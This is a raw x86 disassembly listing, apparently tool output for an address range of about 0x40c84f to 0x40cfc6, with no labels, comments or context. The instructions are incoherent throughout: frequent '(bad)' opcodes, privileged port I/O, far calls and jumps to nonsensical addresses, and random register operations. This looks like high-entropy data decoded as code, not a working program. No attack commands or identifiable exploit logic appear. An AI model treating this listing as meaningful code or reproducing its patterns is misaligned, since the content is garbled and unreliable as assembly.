  40c84f:	es cmp al,0xef
  40c852:	sub    bh,ah
  40c854:	push   ebp
  40c855:	mov    ecx,0x5889603e
  40c85a:	mov    ds:0x7967b4f2,al
  40c85f:	mov    esi,0xddd6dd05
  40c864:	sbb    bh,BYTE PTR [ebp+0x637d10b6]
  40c86a:	test   eax,0xd4a9c610
  40c86f:	stos   DWORD PTR es:[edi],eax
  40c870:	not    BYTE PTR [esi+ebx*1-0xf5832be]
  40c877:	cwde   
  40c878:	mov    cl,0x3a
  40c87a:	xchg   esi,eax
  40c87b:	inc    eax
  40c87c:	fldcw  WORD PTR [edi+0x4016a944]
  40c882:	adc    BYTE PTR [esi+0x5c],ah
  40c885:	clc    
  40c886:	imul   esi,DWORD PTR [ecx],0xc0596e2a
  40c88c:	sti    
  40c88d:	inc    esp
  40c88e:	mov    edi,DWORD PTR [ebx+0x7c6ed7a0]
  40c894:	mov    ah,0xb5
  40c896:	push   es
  40c897:	daa    
  40c898:	(bad)  
  40c899:	fld    DWORD PTR [ebx+0x4e]
  40c89c:	or     esp,DWORD PTR [esi+edi*8+0x24]
  40c8a0:	inc    esi
  40c8a1:	gs adc eax,0x20
  40c8a5:	test   edx,0x67dac6bc
  40c8ab:	mov    DWORD PTR [eax*1-0x216ba989],esp
  40c8b2:	test   BYTE PTR [esi+0xa378885],0x9f
  40c8b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8ba:	push   ebx
  40c8bb:	aam    0xa5
  40c8bd:	xchg   edi,eax
  40c8be:	lods   al,BYTE PTR ds:[esi]
  40c8bf:	gs sti 
  40c8c1:	mov    esi,0xfd7b6827
  40c8c6:	je     0x40c925
  40c8c8:	inc    eax
  40c8c9:	xor    bl,BYTE PTR [eax-0x45f7baa6]
  40c8cf:	icebp  
  40c8d0:	add    eax,0x5400327b
  40c8d5:	inc    ecx
  40c8d6:	(bad)  [ecx+ecx*8+0xe37de44]
  40c8dd:	jp     0x40c8aa
  40c8df:	dec    eax
  40c8e0:	das    
  40c8e1:	adc    eax,0xda1fe0c1
  40c8e6:	pop    ds
  40c8e7:	jne    0x40c8d7
  40c8e9:	das    
  40c8ea:	mov    dl,0xe3
  40c8ec:	jle    0x40c8ad
  40c8ee:	or     al,0xc9
  40c8f0:	popa   
  40c8f1:	out    dx,al
  40c8f2:	push   ebx
  40c8f3:	pushf  
  40c8f4:	pop    ebp
  40c8f5:	pop    ebx
  40c8f6:	dec    ecx
  40c8f7:	inc    eax
  40c8f8:	mov    es,WORD PTR [edi+0x46]
  40c8fb:	cmp    esp,edx
  40c8fd:	lock pusha 
  40c8ff:	mov    edi,0x7984be70
  40c904:	je     0x40c8c9
  40c906:	sub    dh,al
  40c908:	or     BYTE PTR [ecx],ah
  40c90a:	imul   BYTE PTR [eax]
  40c90c:	push   ss
  40c90d:	leave  
  40c90e:	imul   eax,eax,0xb77562e3
  40c914:	pop    edx
  40c915:	sahf   
  40c916:	push   0x74
  40c918:	mov    DWORD PTR [ebx-0x61],ecx
  40c91b:	adc    edx,DWORD PTR [esi]
  40c91d:	int    0xdf
  40c91f:	int3   
  40c920:	out    0x74,al
  40c922:	jne    0x40c93b
  40c924:	retf   0x1860
  40c927:	sar    DWORD PTR [ebx+0x2f],1
  40c92a:	outs   dx,BYTE PTR ds:[esi]
  40c92b:	fiadd  WORD PTR [esi+0x7e]
  40c92e:	int3   
  40c92f:	inc    esp
  40c930:	(bad)  
  40c931:	jnp    0x40c95b
  40c933:	mov    dh,BYTE PTR [ecx]
  40c935:	mov    bh,0x5d
  40c937:	fidivr DWORD PTR [ecx]
  40c939:	sbb    eax,0x6eae902a
  40c93e:	ss dec edi
  40c940:	pop    esp
  40c941:	mov    ds:0xa12f9c2f,eax
  40c946:	jmp    0x40c936
  40c948:	inc    edx
  40c949:	sbb    BYTE PTR ds:0x70ceac8d,ch
  40c94f:	aas    
  40c950:	mov    cl,0x7f
  40c952:	fs dec eax
  40c954:	and    eax,edi
  40c956:	fdivr  QWORD PTR [edi+esi*2-0x10]
  40c95a:	enter  0x4a72,0xb1
  40c95e:	in     al,0x1a
  40c960:	inc    esp
  40c961:	into   
  40c962:	scas   eax,DWORD PTR es:[edi]
  40c963:	and    eax,0x1a12d7be
  40c968:	shr    DWORD PTR [edi+0x7385054b],0xd5
  40c96f:	daa    
  40c970:	cmc    
  40c971:	test   ah,al
  40c973:	popa   
  40c974:	int    0xf1
  40c976:	loop   0x40c973
  40c978:	dec    ebx
  40c979:	cmc    
  40c97a:	mov    edi,0x5c176195
  40c97f:	scas   eax,DWORD PTR es:[edi]
  40c980:	mov    ah,0xc9
  40c982:	push   esp
  40c983:	xchg   edx,eax
  40c984:	int    0x65
  40c986:	stc    
  40c987:	and    edi,edx
  40c989:	mov    al,ds:0x6f0477c1
  40c98e:	aad    0xad
  40c990:	mov    bh,0xaa
  40c992:	dec    esi
  40c993:	jno    0x40c9d5
  40c995:	add    eax,0x5838623b
  40c99a:	shl    BYTE PTR [ecx-0x572b1582],0x3e
  40c9a1:	imul   esi,DWORD PTR [ebp-0x1c814005],0x5c42c126
  40c9ab:	out    0x48,al
  40c9ad:	ja     0x40c9f7
  40c9af:	std    
  40c9b0:	(bad)  
  40c9b1:	mov    edx,0xdd2f090c
  40c9b6:	add    ebp,esi
  40c9b8:	or     cl,dl
  40c9ba:	mov    bh,BYTE PTR [ebp+0x69c9e368]
  40c9c0:	sub    al,0xdf
  40c9c2:	ja     0x40c956
  40c9c4:	add    DWORD PTR [esp+ebx*4],esi
  40c9c7:	xor    ebp,DWORD PTR [ebp+0x70]
  40c9ca:	add    DWORD PTR [ecx-0x29],esp
  40c9cd:	outs   dx,DWORD PTR ds:[esi]
  40c9ce:	sbb    eax,0x1c407ad0
  40c9d3:	call   0x1eebda9d
  40c9d8:	jge    0x40ca3b
  40c9da:	daa    
  40c9db:	mul    DWORD PTR es:[ebp-0x3b]
  40c9df:	outs   dx,BYTE PTR ds:[esi]
  40c9e0:	test   DWORD PTR [ebx+0x26db5579],ebx
  40c9e6:	jp     0x40c99b
  40c9e8:	in     al,dx
  40c9e9:	mov    eax,ds:0x3625e3ca
  40c9ee:	adc    al,0x98
  40c9f0:	jb     0x40ca27
  40c9f2:	scas   al,BYTE PTR es:[edi]
  40c9f3:	lds    ecx,FWORD PTR [ebx]
  40c9f5:	aaa    
  40c9f6:	or     esp,DWORD PTR [edx+eiz*8-0xc63cb80]
  40c9fd:	lea    esp,[esi]
  40c9ff:	sub    al,0x57
  40ca01:	inc    ebx
  40ca02:	es push edi
  40ca04:	retf   0x514e
  40ca07:	pop    edx
  40ca08:	scas   eax,DWORD PTR es:[edi]
  40ca09:	pop    edi
  40ca0a:	mov    esp,0x1df8b7fa
  40ca0f:	in     eax,dx
  40ca10:	push   ecx
  40ca11:	lea    esp,[esi]
  40ca13:	mov    bh,BYTE PTR [ecx-0x4a]
  40ca16:	dec    ebx
  40ca17:	scas   eax,DWORD PTR es:[edi]
  40ca18:	sbb    bh,cl
  40ca1a:	and    ebx,DWORD PTR [edi-0x12]
  40ca1d:	in     eax,dx
  40ca1e:	call   0x24d6:0x1790c29b
  40ca25:	cmp    bh,ch
  40ca27:	xchg   edx,eax
  40ca28:	and    al,0xcf
  40ca2a:	mov    ecx,0x3f75d2ba
  40ca2f:	dec    ecx
  40ca30:	test   al,0xd1
  40ca32:	push   esi
  40ca33:	shl    BYTE PTR [ebp+0xfdb7227],0x9f
  40ca3a:	xchg   ecx,eax
  40ca3b:	mov    bl,0x25
  40ca3d:	and    DWORD PTR [eax+ecx*8],edx
  40ca40:	mov    ebx,0xe8f01663
  40ca45:	js     0x40ca95
  40ca47:	push   0xdcf2e78c
  40ca4c:	jns    0x40c9e1
  40ca4e:	bnd jo 0x40ca0a
  40ca51:	or     eax,DWORD PTR [esi]
  40ca53:	inc    ebx
  40ca54:	mov    ch,0x8d
  40ca56:	jnp    0x40ca85
  40ca58:	sar    DWORD PTR [ecx-0x355179bc],0x50
  40ca5f:	push   edx
  40ca60:	inc    DWORD PTR [edi]
  40ca62:	vpmaddwd ymm0,ymm1,ymm3
  40ca66:	sbb    esp,ebp
  40ca68:	test   ebx,ebx
  40ca6a:	test   al,0x3f
  40ca6c:	aam    0xba
  40ca6e:	retf   
  40ca6f:	cmp    bh,bl
  40ca71:	ror    esi,1
  40ca73:	adc    DWORD PTR [edx+0x29],ebx
  40ca76:	push   edi
  40ca77:	loope  0x40caf7
  40ca79:	ins    DWORD PTR es:[edi],dx
  40ca7a:	gs xchg edi,eax
  40ca7c:	les    edi,FWORD PTR ds:0x9524b9e
  40ca82:	scas   eax,DWORD PTR es:[edi]
  40ca83:	fidiv  WORD PTR [edx-0x6dfc328b]
  40ca89:	shr    BYTE PTR [esi+0x32],cl
  40ca8c:	mov    esp,0x11bf2094
  40ca91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca92:	addr16 pop ecx
  40ca94:	cmp    esi,DWORD PTR ds:0xbf54ab6f
  40ca9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca9b:	jle    0x40cb0f
  40ca9d:	jp     0x40caa4
  40ca9f:	xor    al,0xe4
  40caa1:	xor    al,0xce
  40caa3:	pushf  
  40caa4:	inc    esi
  40caa5:	pop    edx
  40caa6:	ds push 0x9
  40caa9:	hlt    
  40caaa:	pop    eax
  40caab:	ja     0x40ca73
  40caad:	xor    BYTE PTR [eax+0x2c729287],ah
  40cab3:	add    al,0x7d
  40cab5:	imul   ebp,DWORD PTR [esi-0x5a],0x4f
  40cab9:	das    
  40caba:	scas   eax,DWORD PTR es:[edi]
  40cabb:	jo     0x40cad0
  40cabd:	in     eax,dx
  40cabe:	or     BYTE PTR [eax+ebp*4+0x4a4ac6a1],bl
  40cac5:	shr    BYTE PTR [ebx-0x212db3a3],0x6f
  40cacc:	aaa    
  40cacd:	adc    DWORD PTR [edi+0x1e665ae6],ebx
  40cad3:	xor    al,dl
  40cad5:	sub    edx,DWORD PTR [edx+0x280300f5]
  40cadb:	adc    edi,DWORD PTR [edx+eiz*1]
  40cade:	xchg   edx,eax
  40cadf:	pop    ebp
  40cae0:	aam    0x8c
  40cae2:	ror    DWORD PTR [ebp-0x14444ecd],cl
  40cae8:	jns    0x40cb2f
  40caea:	adc    al,0x7f
  40caec:	xor    cl,BYTE PTR [edx]
  40caee:	inc    eax
  40caef:	inc    edx
  40caf0:	pop    ds
  40caf1:	mov    gs,WORD PTR [ebx-0x7e84346b]
  40caf7:	cdq    
  40caf8:	scas   eax,DWORD PTR es:[edi]
  40caf9:	pusha  
  40cafa:	mov    ah,0xa8
  40cafc:	test   DWORD PTR [ecx+ebp*1+0x6],edi
  40cb00:	cmc    
  40cb01:	loopne 0x40cb55
  40cb03:	loop   0x40cb48
  40cb05:	bound  ebp,QWORD PTR [esi-0x63faa4e4]
  40cb0b:	mov    dl,0x3
  40cb0d:	add    DWORD PTR [ecx+0x7bca291e],esi
  40cb13:	ficomp DWORD PTR [ebp+esi*2+0x3d]
  40cb17:	mov    eax,ds:0x933423ca
  40cb1c:	xchg   ebp,eax
  40cb1d:	or     eax,0x292adffe
  40cb22:	jge    0x40cb9c
  40cb24:	and    eax,ebx
  40cb26:	shl    BYTE PTR [edx-0x6b],0x5
  40cb2a:	jecxz  0x40cab3
  40cb2c:	inc    edx
  40cb2d:	pop    edi
  40cb2e:	add    DWORD PTR [edi+0x62c8749],0xac7a7f8e
  40cb38:	dec    ebp
  40cb39:	push   0xbf9fbc11
  40cb3e:	ror    ecx,cl
  40cb40:	neg    DWORD PTR [edi]
  40cb42:	imul   ecx,DWORD PTR [ebp-0x15499645],0xd248350e
  40cb4c:	and    eax,0xb679760a
  40cb51:	push   0xffffffbf
  40cb53:	xchg   esp,eax
  40cb54:	pop    ds
  40cb55:	fadd   QWORD PTR [ebx-0x3c]
  40cb58:	pusha  
  40cb59:	loopne 0x40cb71
  40cb5b:	xchg   esi,eax
  40cb5c:	(bad)  
  40cb5d:	mov    edx,0x3dd43394
  40cb62:	adc    eax,0xb3d9bf07
  40cb67:	pop    ecx
  40cb68:	ror    ecx,1
  40cb6a:	cmp    al,0x40
  40cb6c:	sub    al,0xd4
  40cb6e:	sub    dh,BYTE PTR [eax-0x5a]
  40cb71:	sub    eax,0xc633e9f7
  40cb76:	dec    edx
  40cb77:	or     ecx,edx
  40cb79:	inc    ebp
  40cb7a:	pop    eax
  40cb7b:	sbb    ebp,esi
  40cb7d:	in     eax,0xdd
  40cb7f:	inc    ebx
  40cb80:	xchg   ebx,eax
  40cb81:	add    BYTE PTR [edi],cl
  40cb83:	cmp    ch,bl
  40cb85:	mov    edx,DWORD PTR [ebp-0x4d]
  40cb88:	sbb    al,0x88
  40cb8a:	inc    esi
  40cb8b:	in     al,0x71
  40cb8d:	push   ecx
  40cb8e:	scas   al,BYTE PTR es:[edi]
  40cb8f:	icebp  
  40cb90:	ficom  WORD PTR [esi+0x7]
  40cb93:	xchg   ecx,eax
  40cb94:	inc    esi
  40cb95:	scas   al,BYTE PTR es:[edi]
  40cb96:	cmp    esi,eax
  40cb98:	jmp    0x9940a737
  40cb9d:	je     0x40cb8d
  40cb9f:	loopne 0x40cb78
  40cba1:	or     ch,BYTE PTR [ecx+0x78]
  40cba4:	inc    edi
  40cba5:	outs   dx,BYTE PTR ds:[esi]
  40cba6:	mov    ?,WORD PTR cs:[eax+ebx*4+0x30]
  40cbab:	arpl   WORD PTR [edx+0x3c],si
  40cbae:	rol    BYTE PTR [eax-0x2e2cefca],1
  40cbb4:	jnp    0x40cb4c
  40cbb6:	stos   BYTE PTR es:[edi],al
  40cbb7:	test   BYTE PTR ds:0x21a8c9d,cl
  40cbbd:	push   edi
  40cbbe:	pusha  
  40cbbf:	shl    DWORD PTR [ecx+0x39cb113b],1
  40cbc5:	(bad)  
  40cbc6:	mov    bl,0x91
  40cbc8:	mov    WORD PTR [edx],ds
  40cbca:	add    ch,BYTE PTR [ebp+0x2c8a2cfb]
  40cbd0:	cmp    esp,edi
  40cbd2:	jne    0x40cb72
  40cbd4:	cmp    eax,0x383c69a8
  40cbd9:	cmp    al,0xe8
  40cbdb:	lahf   
  40cbdc:	push   eax
  40cbdd:	inc    esp
  40cbde:	lds    ebx,FWORD PTR [edx]
  40cbe0:	dec    BYTE PTR [ebx]
  40cbe2:	cwde   
  40cbe3:	iret   
  40cbe4:	(bad)  
  40cbe5:	(bad)  
  40cbe7:	and    al,0xb2
  40cbe9:	xor    DWORD PTR [edi],esi
  40cbeb:	dec    esi
  40cbec:	mov    bl,0xd5
  40cbee:	pop    ebx
  40cbef:	xor    esi,DWORD PTR [edi-0x18]
  40cbf2:	in     eax,dx
  40cbf3:	addr16 aas 
  40cbf5:	pusha  
  40cbf6:	mov    bl,0xd0
  40cbf8:	lods   al,BYTE PTR ds:[esi]
  40cbf9:	inc    ebp
  40cbfa:	or     BYTE PTR [ebx-0x1],0x8
  40cbfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbff:	imul   eax,esi,0x7766a165
  40cc05:	in     eax,0xda
  40cc07:	div    DWORD PTR [ecx-0x45]
  40cc0a:	outs   dx,BYTE PTR ds:[esi]
  40cc0b:	or     BYTE PTR [ebx+0x1efedf3],ch
  40cc11:	add    eax,0xf53b4a97
  40cc16:	hlt    
  40cc17:	scas   al,BYTE PTR es:[edi]
  40cc18:	ret    0xd701
  40cc1b:	push   ecx
  40cc1c:	into   
  40cc1d:	push   edi
  40cc1e:	scas   eax,DWORD PTR es:[edi]
  40cc1f:	adc    edi,0xffffff87
  40cc22:	mov    edx,0x6ba6dd52
  40cc27:	and    al,dl
  40cc29:	fnstenv ds:0x849c0da2
  40cc2f:	sub    al,0xc0
  40cc31:	add    eax,0x325f7f
  40cc36:	cmp    edx,edx
  40cc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc39:	cmp    eax,0xc78db469
  40cc3e:	lods   al,BYTE PTR ds:[esi]
  40cc3f:	fstp   TBYTE PTR [edi]
  40cc41:	je     0x40cc73
  40cc43:	repnz mov ecx,0x12bcf7c8
  40cc49:	dec    ebp
  40cc4a:	and    eax,0xd3882a96
  40cc4f:	jnp    0x40cc2e
  40cc51:	mov    bl,0xce
  40cc53:	scas   al,BYTE PTR es:[edi]
  40cc54:	push   ss
  40cc55:	push   0xffffffdc
  40cc57:	push   edx
  40cc58:	jge    0x40cc74
  40cc5a:	aad    0x13
  40cc5c:	jmp    0x40cc1d
  40cc5e:	sub    ecx,DWORD PTR [eax]
  40cc60:	outs   dx,DWORD PTR ds:[esi]
  40cc61:	jnp    0x40cbea
  40cc63:	in     eax,0xab
  40cc65:	loop   0x40cca0
  40cc67:	inc    ebp
  40cc68:	pop    ebx
  40cc69:	mov    WORD PTR [ebx],cs
  40cc6b:	xlat   BYTE PTR ds:[ebx]
  40cc6c:	cli    
  40cc6d:	xchg   ebp,ecx
  40cc6f:	jg     0x40cc34
  40cc71:	ss push edx
  40cc73:	test   al,0x99
  40cc75:	and    eax,0x48239aae
  40cc7a:	adc    bh,BYTE PTR [ebp+0x1ba7206]
  40cc80:	add    eax,DWORD PTR [edx]
  40cc82:	jmp    0x2f69ff77
  40cc87:	push   edx
  40cc88:	icebp  
  40cc89:	(bad)  
  40cc8a:	retf   0x8ffb
  40cc8d:	cmp    DWORD PTR [ecx-0x62],0xe00a8ae0
  40cc94:	popf   
  40cc95:	adc    BYTE PTR ds:0xa31d5dee,dl
  40cc9b:	aaa    
  40cc9c:	pop    edi
  40cc9d:	and    DWORD PTR [ecx+0x1d6641ce],eax
  40cca3:	ret    
  40cca4:	call   0xa979f66a
  40cca9:	int3   
  40ccaa:	and    eax,0xc01926b5
  40ccaf:	sub    BYTE PTR [eax+0x3044a6a],ch
  40ccb5:	mov    al,ds:0xe346341b
  40ccba:	gs mov ecx,0x8030778a
  40ccc0:	mov    cs,WORD PTR [edi+esi*4]
  40ccc3:	retf   0xc50a
  40ccc6:	mov    cl,0x4c
  40ccc8:	sbb    al,dh
  40ccca:	aam    0xb
  40cccc:	dec    ebx
  40cccd:	push   cs
  40ccce:	je     0x40ccc7
  40ccd0:	clc    
  40ccd1:	out    dx,al
  40ccd2:	pop    edi
  40ccd3:	dec    eax
  40ccd4:	mov    ds:0xbbba19a,al
  40ccd9:	into   
  40ccda:	push   esi
  40ccdb:	xor    BYTE PTR [esi-0x2c3a30a],0x24
  40cce2:	jae    0x40ccaa
  40cce4:	ins    DWORD PTR es:[edi],dx
  40cce5:	xchg   esp,eax
  40cce6:	mov    esp,0x20d0d96a
  40cceb:	sbb    al,0x2
  40cced:	or     DWORD PTR [ebx+0x22],eax
  40ccf0:	in     al,dx
  40ccf1:	cdq    
  40ccf2:	cs lahf 
  40ccf4:	gs mov esi,0xdc91db82
  40ccfa:	sub    DWORD PTR [edx+edi*4],ecx
  40ccfd:	repz imul ebp,DWORD PTR [esi+0x5dc0813a],0x4bd2ee54
  40cd08:	imul   edx,esi,0xffffffc0
  40cd0b:	mov    eax,ds:0xff95f8d
  40cd10:	add    al,bl
  40cd12:	push   ecx
  40cd13:	(bad)  [ecx]
  40cd15:	popf   
  40cd16:	ffree  st(5)
  40cd18:	aaa    
  40cd19:	outs   dx,DWORD PTR ds:[esi]
  40cd1a:	in     eax,0xf1
  40cd1c:	xchg   edi,eax
  40cd1d:	out    dx,eax
  40cd1e:	pop    ecx
  40cd1f:	lds    ecx,FWORD PTR [esi]
  40cd21:	lds    edi,FWORD PTR [ecx-0x4ae204d4]
  40cd27:	xlat   BYTE PTR ds:[ebx]
  40cd28:	clc    
  40cd29:	neg    BYTE PTR [edi-0x24e4de55]
  40cd2f:	sbb    BYTE PTR [ecx-0x68be5546],bl
  40cd35:	gs mov esi,0xc0d7602a
  40cd3b:	shr    ch,1
  40cd3d:	push   ss
  40cd3e:	pop    es
  40cd3f:	test   DWORD PTR [edi],edi
  40cd41:	dec    edi
  40cd42:	push   DWORD PTR [ecx]
  40cd44:	fadd   QWORD PTR [ebx+0x3ab081dc]
  40cd4a:	addr16 inc ebx
  40cd4c:	sub    al,0x5e
  40cd4e:	mov    esp,0x5ab5a4af
  40cd53:	jmp    0x16e9a425
  40cd58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd59:	dec    edx
  40cd5a:	ja     0x40cd63
  40cd5c:	cli    
  40cd5d:	inc    esi
  40cd5e:	ss jnp 0x40cdad
  40cd61:	adc    eax,0x3099ec3f
  40cd66:	js     0x40cd06
  40cd68:	daa    
  40cd69:	into   
  40cd6a:	aam    0x94
  40cd6c:	mov    al,0x31
  40cd6e:	call   0xf3fb9016
  40cd73:	(bad)  
  40cd74:	in     eax,dx
  40cd75:	pop    edi
  40cd76:	pop    ecx
  40cd77:	add    DWORD PTR [ebx-0x51ef10f9],eax
  40cd7d:	mov    BYTE PTR [ebx-0x7b],dl
  40cd80:	push   DWORD PTR [esi-0x56718b4]
  40cd86:	cmp    BYTE PTR [edi],dh
  40cd88:	outs   dx,DWORD PTR ds:[esi]
  40cd89:	mov    ebp,0x54c09710
  40cd8e:	push   DWORD PTR [ebx]
  40cd90:	xchg   ebp,ebp
  40cd92:	dec    edx
  40cd93:	mov    ah,0x39
  40cd95:	dec    eax
  40cd96:	jmp    0x203c:0xe89d3908
  40cd9d:	stos   BYTE PTR es:[edi],al
  40cd9e:	rol    BYTE PTR [eax-0xa],0x7a
  40cda2:	xor    DWORD PTR [eax-0x1a9d96a7],eax
  40cda8:	stc    
  40cda9:	dec    edi
  40cdaa:	popf   
  40cdab:	jns    0x40cd87
  40cdad:	inc    eax
  40cdae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdaf:	mov    WORD PTR [edx],es
  40cdb1:	lods   eax,DWORD PTR ds:[esi]
  40cdb2:	and    ah,dl
  40cdb4:	fisub  WORD PTR [edi+0x2c166e21]
  40cdba:	js     0x40cdc0
  40cdbc:	clc    
  40cdbd:	add    eax,DWORD PTR [ecx]
  40cdbf:	retf   0x2f93
  40cdc2:	das    
  40cdc3:	pop    ebp
  40cdc4:	or     esi,eax
  40cdc6:	cld    
  40cdc7:	call   0xc3539664
  40cdcc:	xor    BYTE PTR [ecx+0x5],dh
  40cdcf:	(bad)  
  40cdd0:	fistp  QWORD PTR [ecx+0x4a92f5b1]
  40cdd6:	mov    DWORD PTR [ebx-0x41e76d3],ebp
  40cddc:	jno    0x40cd8f
  40cdde:	fcomi  st,st(3)
  40cde0:	retf   
  40cde1:	xor    BYTE PTR [ecx-0x3cddd283],al
  40cde7:	outs   dx,DWORD PTR ds:[esi]
  40cde8:	clc    
  40cde9:	mov    ss,WORD PTR [edi+0x12]
  40cdec:	ins    BYTE PTR es:[edi],dx
  40cded:	and    ah,bh
  40cdef:	lea    bp,[ecx+0x571b1116]
  40cdf6:	adc    ecx,DWORD PTR ds:0x95bf621e
  40cdfc:	mov    ebx,0x105e7ba9
  40ce01:	dec    edx
  40ce02:	xor    ebp,DWORD PTR cs:[eax+0x5fedeec]
  40ce09:	out    0x34,eax
  40ce0b:	inc    edi
  40ce0c:	call   0xc23d:0xd8bebe52
  40ce13:	test   al,0x2b
  40ce15:	xchg   esp,eax
  40ce16:	mov    fs,WORD PTR [edi+0x4290d773]
  40ce1c:	sub    eax,ebp
  40ce1e:	xor    bl,BYTE PTR [ecx+0x3]
  40ce21:	icebp  
  40ce22:	ds jg  0x40ce11
  40ce25:	jno    0x40ce1a
  40ce27:	loope  0x40cde1
  40ce29:	mov    WORD PTR [ebp-0x52faf58b],?
  40ce2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce30:	sbb    eax,0x32dd5a79
  40ce35:	ins    BYTE PTR es:[edi],dx
  40ce36:	pop    esi
  40ce37:	outs   dx,DWORD PTR ds:[esi]
  40ce38:	add    al,0xb5
  40ce3a:	sub    edx,DWORD PTR [esi-0xa0dc16c]
  40ce40:	pop    ebx
  40ce41:	shr    bl,0x3a
  40ce44:	or     dl,BYTE PTR [ebp-0x5d]
  40ce47:	(bad)  [ecx-0x2c]
  40ce4a:	iret   
  40ce4b:	or     eax,0x939010af
  40ce50:	xor    DWORD PTR [esi],edx
  40ce52:	cmp    eax,0x820cc870
  40ce57:	cmp    BYTE PTR [ecx],bl
  40ce59:	cmp    eax,0x23d3e005
  40ce5e:	jbe    0x23a5195f
  40ce64:	and    BYTE PTR [esi+0x9dd302c],dh
  40ce6a:	pop    edi
  40ce6b:	imul   edi,DWORD PTR [ecx+0x70],0xac271310
  40ce72:	xchg   esi,eax
  40ce73:	xor    ch,BYTE PTR [esi-0x71e4fe9e]
  40ce79:	cdq    
  40ce7a:	jmp    FWORD PTR [eax+0x67]
  40ce7d:	jg     0x40cea5
  40ce7f:	and    ecx,ebx
  40ce81:	dec    DWORD PTR [ebx+edi*2+0x6dd0dc94]
  40ce88:	sub    edi,edi
  40ce8a:	sbb    eax,0x699a0e65
  40ce8f:	add    al,0x75
  40ce91:	pop    esp
  40ce92:	pusha  
  40ce93:	jnp    0x40cea8
  40ce95:	xor    esp,DWORD PTR [ebx-0x2d7043f5]
  40ce9b:	dec    esp
  40ce9c:	fisub  WORD PTR [ecx-0x19eb86c9]
  40cea2:	pop    eax
  40cea3:	push   ebp
  40cea4:	arpl   WORD PTR [edx+0x2c43daf0],dx
  40ceaa:	(bad)  
  40ceab:	mov    DWORD PTR [eax],esi
  40cead:	call   0xc515fbb6
  40ceb2:	inc    esi
  40ceb3:	sub    ebp,DWORD PTR [edi+0x26eff5dd]
  40ceb9:	(bad)  
  40ceba:	jl     0x40cf34
  40cebc:	shl    BYTE PTR [edx+ebx*4],cl
  40cebf:	dec    edi
  40cec0:	out    0xb0,eax
  40cec2:	ret    
  40cec3:	mov    al,al
  40cec5:	je     0x40ce6d
  40cec7:	xor    cl,BYTE PTR [edx+0x5876e8a2]
  40cecd:	sbb    eax,0xa76438e4
  40ced2:	mov    eax,ds:0xbce74c79
  40ced7:	add    eax,0x1d854473
  40cedc:	pusha  
  40cedd:	push   ebx
  40cede:	pop    edi
  40cedf:	std    
  40cee0:	or     eax,0xf274b027
  40cee5:	and    ebx,DWORD PTR [ebx-0x3e]
  40cee8:	popf   
  40cee9:	mov    DWORD PTR [edx],ebp
  40ceeb:	mov    ebx,0xac7403f4
  40cef0:	das    
  40cef1:	jns    0x40cf2d
  40cef3:	or     al,0xf
  40cef5:	imul   esi,eax,0x5d5b1a67
  40cefb:	idiv   eax
  40cefd:	push   0x34
  40ceff:	add    al,0xaf
  40cf01:	fldcw  WORD PTR [ecx]
  40cf03:	test   eax,0x2d244091
  40cf08:	sbb    ah,BYTE PTR [edi+edi*4+0xbbf2a24]
  40cf0f:	mov    ch,0x90
  40cf11:	ret    0x429c
  40cf14:	in     al,0x14
  40cf16:	or     ebp,DWORD PTR [edx-0x62055912]
  40cf1c:	test   BYTE PTR [esi],bl
  40cf1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf1f:	(bad)  
  40cf20:	iret   
  40cf21:	test   al,0x62
  40cf23:	retf   0x4cd0
  40cf26:	jmp    0x1ef4373f
  40cf2b:	and    eax,0xd5c8f4d7
  40cf30:	test   BYTE PTR [ebx+esi*1+0x1b3f790a],bl
  40cf37:	aam    0xe6
  40cf39:	mov    al,0x4b
  40cf3b:	jns    0x40ced9
  40cf3d:	cvtpi2ps xmm2,QWORD PTR [eax-0x17]
  40cf41:	jne    0x40cf1e
  40cf43:	(bad)  
  40cf44:	nop
  40cf45:	js     0x40cfb4
  40cf47:	and    DWORD PTR fs:[edi+0x19],ebp
  40cf4b:	xchg   BYTE PTR [ecx+0x23],cl
  40cf4e:	or     esp,DWORD PTR [ebx+0x10]
  40cf51:	jmp    0x4a94f0d0
  40cf56:	mov    DWORD PTR [ebx],edx
  40cf58:	push   edi
  40cf59:	retf   0x9c8b
  40cf5c:	test   BYTE PTR [edi],cl
  40cf5e:	mov    edx,eax
  40cf60:	push   ds
  40cf61:	inc    esi
  40cf62:	loopne 0x40cf7b
  40cf64:	mov    ebx,0x54b6b101
  40cf69:	mov    al,0x59
  40cf6b:	adc    eax,0xdf543d3f
  40cf70:	xor    al,0x65
  40cf72:	mov    ah,0xfc
  40cf74:	push   cs
  40cf75:	fwait
  40cf76:	mov    edi,0x1b83c144
  40cf7b:	pop    es
  40cf7c:	sbb    eax,0x5f08c1df
  40cf81:	js     0x40cf77
  40cf83:	or     eax,0x38bc0a31
  40cf88:	fld    st(3)
  40cf8a:	shl    BYTE PTR [esi],1
  40cf8c:	scas   al,BYTE PTR es:[edi]
  40cf8d:	inc    eax
  40cf8e:	push   eax
  40cf8f:	shr    DWORD PTR [ebx],cl
  40cf91:	js     0x40cff9
  40cf93:	and    esi,DWORD PTR [edx+eax*8]
  40cf96:	mov    bl,0xbe
  40cf98:	lea    esi,[edx-0x71]
  40cf9b:	adc    BYTE PTR [esi-0x52],cl
  40cf9e:	mov    DWORD PTR [ebx+ecx*1],ecx
  40cfa1:	adc    ah,bh
  40cfa3:	sar    edi,cl
  40cfa5:	pop    esp
  40cfa6:	inc    esp
  40cfa7:	(bad)  
  40cfa9:	inc    ebx
  40cfaa:	shl    ebp,cl
  40cfac:	xchg   esp,eax
  40cfad:	or     BYTE PTR ds:0x6d2aa3c8,dl
  40cfb3:	ret    0xc81
  40cfb6:	retf   
  40cfb7:	mov    bl,0x2b
  40cfb9:	mov    ch,0xe5
  40cfbb:	or     esi,DWORD PTR [edx]
  40cfbd:	jns    0x40cfd7
  40cfbf:	sbb    BYTE PTR [edi],bh
  40cfc1:	mov    bl,0xc9
  40cfc3:	dec    esp
  40cfc4:	jge    0x40cfc6
  40cfc6:	push   edi
